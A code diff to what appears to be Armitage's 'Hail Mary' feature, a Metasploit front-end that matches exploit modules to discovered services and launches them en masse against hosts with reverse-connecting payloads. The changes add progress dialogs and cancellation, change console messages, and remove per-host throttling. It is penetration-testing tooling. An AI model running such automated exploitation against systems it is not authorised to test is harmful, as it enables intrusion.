@@ -97,6 +97,11 @@ sub resolveAttacks {
 }
 
 sub _resolveAttacks {
+	local('$progress $x');
+	$progress = [new ProgressMonitor: $null, "Querying exploits...", "...", 0, size(@exploits)];
+	[$progress setNote: "refreshing service info"];
+	[$progress setProgress: 0];
+
 	# force a service data refresh before hail mary or find attacks.
 	_refreshServices(call($mclient, "db.services")['services']);
 
@@ -114,8 +119,10 @@ sub _resolveAttacks {
 	#
 	
 	$s = rankScore($args[1]);
-	foreach $module (@exploits) {
+	foreach $x => $module (@exploits) {
 		if (%exploits[$module]["rankScore"] >= $s) { 
+			[$progress setNote: "$module"];
+			[$progress setProgress: $x];
 			$r = call($client, "module.options", "exploit", $module);
 			yield 2;
 			if ("RPORT" in $r && "default" in $r["RPORT"]) {
@@ -142,6 +149,7 @@ sub _resolveAttacks {
 	# for each host, see if there is an exploit associated with its port and if so, report it...
 	#
 
+	[$progress setNote: "matching exploits to hosts"];
 	local('$port $modules $host $data $services $exploit');
 
 	foreach $port => $modules (%r) {
@@ -156,6 +164,8 @@ sub _resolveAttacks {
 		}
 	}
 
+	[$progress close];
+	yield 100;
 	[$args[2]];
 }
 
@@ -170,11 +180,20 @@ sub smarter_autopwn {
 	elog("has given up and launched the hail mary!");
 
 	$console = createDisplayTab("Hail Mary", 1, $host => "all", $file => "hailmary");
-	[[$console getWindow] append: "\n\n1) Finding exploits (via local magic)\n\n"];
+	[[$console getWindow] append: "[*] Finding exploits (via local magic)\n"];
 
 	resolveAttacks($1, $2, lambda({
 		# now crawl through %results and start hacking each host in turn
-		local('$host $exploits @allowed $ex $os $port $exploit @attacks %dupes $e $p');
+		local('$host $exploits @allowed $ex $os $port $exploit @attacks %dupes $e $p $count $z $progress');
+
+		# total size?
+		foreach $host => $exploits (%results2) {
+			$count += size($exploits);
+		}
+
+		$progress = [new ProgressMonitor: $null, "Querying payloads...", "...", 0, $count];
+		[$progress setNote: "let's begin..."];
+		[$progress setProgress: 0];
 
 		# filter the attacks...
 		foreach $host => $exploits (%results2) {
@@ -191,11 +210,22 @@ sub smarter_autopwn {
 					}
 					%dupes[$ex] = 1;
 				}
+
+				$z++;
+				[$progress setNote: "$host / $exploit"];
+				[$progress setProgress: $z];
+				if ([$progress isCanceled]) {
+					[$progress close];
+					[[$console getWindow] append: "[-] user canceled the hail mary\n"];
+					return;
+				}
 			}
-			[[$console getWindow] append: "\t[ $+ $host $+ ] Found " . size($exploits) . " exploits\n" ];
+			[[$console getWindow] append: "[+] \t $+ $host $+ : found " . size($exploits) . " exploits\n" ];
 		}
 
-		[[$console getWindow] append: "\n2) Sorting Exploits\n"];
+		[$progress close];
+
+		[[$console getWindow] append: "[*] Sorting Exploits...\n"];
 
 		# now sort them, so the best ones are on top...
 		sort({
@@ -217,38 +247,44 @@ sub smarter_autopwn {
 			return $b['rankScore'] <=> $a['rankScore'];
 		}, @attacks);
 
-		[[$console getWindow] append: "\n3) Launching Exploits\n\n"];
+		[[$console getWindow] append: "[*] Launching Exploits...\n"];
 
 		# now execute them...
-		local('$progress');
-		$progress = [new ProgressMonitor: $null, "Launching Exploits...", "...", 0, size(@attacks)];
+			$progress = [new ProgressMonitor: $null, "Launching Exploits...", "...", 0, size(@attacks)];
 
 		thread(lambda({
 			local('$host $ex $payload $x $rport %wait $options');
 			while (size(@attacks) > 0 && [$progress isCanceled] == 0) {
 				($host, $ex, $payload, $rport) = @attacks[0];
 
-				# let's throttle our exploit/host velocity a little bit.
-				if ((ticks() - %wait[$host]) > 1250) {
-					yield 250;
-				}
-				else {
-					yield 1500;
-				}
+				yield 250;
 
 				[$progress setNote: "$host $+ : $+ $rport ( $+ $ex $+ )"];
+				[[$console getWindow] append: "[*] $host $+ : $+ $rport ( $+ $ex $+ )\n"];
 				[$progress setProgress: $x + 0];
 
 				$options = %(PAYLOAD => $payload, RHOST => $host, LHOST => $MY_ADDRESS, LPORT => randomPort() . '', RPORT => "$rport", TARGET => '0', SSL => iff($rport == 443, '1'));
 				($ex, $host, $options) = filter_data("exploit", $ex, $host, $options);
 				call_async($client, "module.execute", "exploit", $ex, $options);
-				%wait[$host] = ticks();
 				$x++; 
 				@attacks = sublist(@attacks, 1);
 			}
+
 			[$progress close];
 
-			[[$console getWindow] append: "\n\n4) Listing sessions\n\n"];
+			if ([$progress isCanceled]) {
+				[[$console getWindow] append: "[-] user canceled the hail mary\n"];
+				return;
+			}
+
+			[[$console getWindow] append: "[*] Listing sessions...\n"];
+
+			# loop, indicating that we're waiting 60 seconds before listing sessions...
+			for ($x = 0; $x < 30; $x++) {
+				[[$console getWindow] updatePrompt: "Listing sessions in \c0" . (30 - $x) . "\o second" . iff($x == 1, ' ', 's ') . (" " x 10) ];
+				yield 1000;
+			}
+			[[$console getWindow] updatePrompt: ""];
 
 			[$console addCommand: $null, "sessions -v"];
 			[$console start];
